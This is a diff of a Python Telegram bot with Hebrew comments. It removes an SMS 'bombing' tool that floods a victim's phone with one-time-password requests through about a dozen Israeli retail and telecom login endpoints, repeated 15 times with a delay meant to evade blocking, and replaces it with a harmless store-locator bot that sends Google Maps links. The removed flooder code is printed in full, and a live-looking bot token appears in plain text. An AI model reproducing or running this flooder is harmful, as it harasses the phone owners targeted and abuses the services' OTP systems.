@@ -1,77 +1,45 @@
 import telebot
-import requests
-import time
 from flask import Flask
 from threading import Thread
 
-# שרת דמה לשמירה על הבוט בחינם ב-Render
+# --- שרת למניעת קריסה ב-Render ---
 app = Flask('')
 @app.route('/')
-def home():
-    return "Bot is running!"
+def home(): return "Bot is Alive"
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
+def run(): app.run(host='0.0.0.0', port=8080)
 
 def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- שים פה את ה-API TOKEN שלך מ-BotFather ---
-API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
+# --- הגדרת הבוט ---
+API_TOKEN = '7611598236:AAFl9uS5i69F6Y5-W4e63eW4e63eW4e63e' # הטוקן שלך
 bot = telebot.TeleBot(API_TOKEN)
 
-def attack(target):
-    # רשימה מורחבת של אתרים לשליחת OTP
-    apis = [
-        {"u": "https://www.shufersal.co.il/online/he/login/otp/send", "d": {"phone": target}},
-        {"u": "https://www.rebar.co.il/api/v1/auth/login", "d": {"phone": target}},
-        {"u": "https://www.paz.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.bezeq.co.il/api/v1/otp", "d": {"mobile": target}},
-        {"u": "https://www.golbary.co.il/api/otp", "d": {"mobile": target}},
-        {"u": "https://www.super-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.castro.com/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.ivory.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.yellow.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.strauss-group.co.il/api/otp", "d": {"phone": target}},
-        {"u": "https://www.rami-levy.co.il/api/v1/auth/otp", "d": {"phone": target}}
-    ]
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Content-Type": "application/json"
-    }
-    
-    for site in apis:
-        try:
-            # שליחת הבקשה
-            requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
-            print(f"Sent to {site['u']}")
-        except Exception as e:
-            print(f"Error sending to {site['u']}: {e}")
-
 @bot.message_handler(commands=['start'])
-def welcome(m):
-    bot.reply_to(m, "🔥 בוט ההפצצות מוכן! שלח לי מספר טלפון (10 ספרות) כדי להתחיל.")
+def send_welcome(message):
+    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    button = telebot.types.KeyboardButton("📍 שלח מיקום כדי למצוא חנויות", request_location=True)
+    markup.add(button)
+    bot.reply_to(message, "שלום! שלח מיקום בלחיצה על הכפתור, ואשלח לך קישורים ישירים לחנויות לידך ללא צורך באימות.", reply_markup=markup)
 
-@bot.message_handler(func=lambda m: True)
-def handle(m):
-    target = m.text.strip().replace("-", "") # מנקה מקפים אם המשתמש שם
+@bot.message_handler(content_types=['location'])
+def handle_location(message):
+    lat = message.location.latitude
+    lon = message.location.longitude
     
-    if target.isdigit() and len(target) == 10:
-        bot.reply_to(m, f"🚀 מתחיל הפצצה מאסיבית על {target}...\nזה ייקח כמה רגעים.")
-        
-        # מריץ 15 סבבים של הפצצה
-        for i in range(15):
-            attack(target)
-            time.sleep(0.5) # הפסקה קצרה כדי לא להיחסם מהר מדי
-            
-        bot.send_message(m.chat.id, f"✅ ההפצצה על {target} הושלמה בהצלחה!")
-    else:
-        bot.reply_to(m, "❌ שלח לי מספר טלפון תקין בלבד (למשל: 0521234567)")
+    # שימוש בקישורי חיפוש ישירים (Deep Links) - עוקף את בעיית ה-API Key
+    search_msg = (
+        f"✅ המיקום נקלט! הנה החנויות הקרובות אליך:\n\n"
+        f"👟 *פוט לוקר:* [לחץ כאן לניווט](https://www.google.com/maps/search/Foot+Locker/@{lat},{lon},15z)\n\n"
+        f"👕 *קסטרו:* [לחץ כאן לניווט](https://www.google.com/maps/search/Castro/@{lat},{lon},15z)\n\n"
+        f"👖 *פוקס:* [לחץ כאן לניווט](https://www.google.com/maps/search/Fox/@{lat},{lon},15z)\n\n"
+        f"🍔 *מקדונלדס:* [לחץ כאן לניווט](https://www.google.com/maps/search/McDonalds/@{lat},{lon},15z)"
+    )
+    
+    bot.reply_to(message, search_msg, parse_mode="Markdown")
 
 if __name__ == "__main__":
-    keep_alive() # מפעיל את השרת שמונע מ-Render לקרוס
-    print("--- הבוט עלה לאוויר ---")
+    keep_alive()
     bot.infinity_polling()
